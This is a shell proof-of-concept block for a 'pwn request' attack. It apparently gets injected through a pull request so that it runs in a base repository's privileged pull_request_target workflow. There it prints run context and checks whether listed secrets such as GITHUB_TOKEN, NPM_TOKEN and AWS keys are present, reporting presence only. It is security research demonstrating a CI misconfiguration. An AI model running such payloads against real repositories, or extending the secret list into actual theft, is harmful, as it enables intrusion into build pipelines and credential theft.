# ---------------------------------------------------------------------
# PWN-REQUEST PoC marker block (security research, non-destructive)
# Purpose : prove that untrusted PR code runs in the pull_request_target
#           context of the BASE repository. No secret value is ever read,
#           printed, or transmitted -- presence booleans only.
# Marker  : PWN_REQUEST_POC_OK
# ---------------------------------------------------------------------
poc_out() {
  echo "$@"
  if [ -n "${GITHUB_STEP_SUMMARY:-}" ]; then echo "$@" >> "$GITHUB_STEP_SUMMARY"; fi
}
poc_out "PWN_REQUEST_POC_OK"
poc_out "event        : ${GITHUB_EVENT_NAME:-?}"
poc_out "repository   : ${GITHUB_REPOSITORY:-?}"
poc_out "workflow     : ${GITHUB_WORKFLOW:-?}"
poc_out "job          : ${GITHUB_JOB:-?}"
poc_out "actor        : ${GITHUB_ACTOR:-?}"
poc_out "ref          : ${GITHUB_REF:-?}"
poc_out "head sha     : $(git rev-parse HEAD 2>/dev/null || echo '?')"
poc_out "run id       : ${GITHUB_RUN_ID:-?}"
poc_out "--- privileged-context signals (presence booleans only) ---"
for v in SONAR_TOKEN GITHUB_TOKEN DOCKER_HUB_TOKEN QUAY_TOKEN OPENAI_API_KEY NPM_TOKEN AWS_SECRET_ACCESS_KEY CODECOV_TOKEN; do
  if printenv "$v" >/dev/null 2>&1; then poc_out "env $v : PRESENT"; else poc_out "env $v : absent"; fi
done
if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  poc_out "OIDC id-token endpoint : PRESENT (id-token: write)"
else
  poc_out "OIDC id-token endpoint : absent"
fi
poc_out "--- end PoC ---"
# ---------------------------------------------------------------------
